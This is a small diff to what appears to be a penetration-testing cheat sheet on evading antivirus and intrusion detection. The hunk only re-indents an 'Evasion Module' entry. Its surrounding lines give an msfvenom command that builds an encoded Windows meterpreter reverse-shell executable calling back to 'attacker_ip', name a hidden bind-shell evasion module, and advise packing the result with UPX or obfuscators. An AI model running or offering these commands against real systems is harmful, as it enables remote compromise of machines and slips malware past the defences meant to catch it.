@@ -41,8 +41,11 @@ Purpose: Evade antivirus/IDS when delivering payloads.
 
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe
 
-Evasion Module:
-use evasion/windows/meterpreter/bindshell_hidden
+
+	Evasion Module:
+
+	use evasion/windows/meterpreter/bindshell_hidden
+
 Tip: Combine with packing tools (UPX) or obfuscators.
 
 
